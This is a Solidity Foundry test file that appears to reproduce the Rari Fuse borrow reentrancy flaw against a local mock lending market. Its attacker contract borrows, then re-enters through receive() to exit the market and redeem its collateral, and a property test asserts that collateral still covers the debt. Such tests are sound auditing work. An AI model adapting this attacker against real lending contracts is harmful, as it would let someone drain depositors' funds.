// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {RariFuseLikeMarket} from "../src/36_RariFuseBorrowReentrancy.sol";

contract RariFuseBorrowAttacker {
    RariFuseLikeMarket public market;
    bool public reentered;

    constructor(RariFuseLikeMarket _market) {
        market = _market;
    }

    function attack(uint256 collateralAmount, uint256 borrowAmount) external {
        require(address(this).balance >= collateralAmount, "funding");
        market.enterAndSupply{value: collateralAmount}();
        market.borrow(borrowAmount);
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            market.exitMarket();
            market.redeemCollateral(market.collateral(address(this)));
        }
    }
}

contract RariFuseBorrowReentrancyTest is Test {
    function checkBorrowCannotUnlockCollateral(uint256 collateralAmount, uint256 borrowAmount) public {
        if (collateralAmount < 2 ether || collateralAmount > 100 ether) return;
        if (borrowAmount == 0 || borrowAmount > collateralAmount / 2) return;

        RariFuseLikeMarket market = new RariFuseLikeMarket();
        market.seedLiquidity{value: 200 ether}();

        RariFuseBorrowAttacker attacker = new RariFuseBorrowAttacker(market);
        vm.deal(address(attacker), collateralAmount);
        attacker.attack(collateralAmount, borrowAmount);

        assert(market.collateral(address(attacker)) / 2 >= market.accountBorrows(address(attacker)));
    }
}
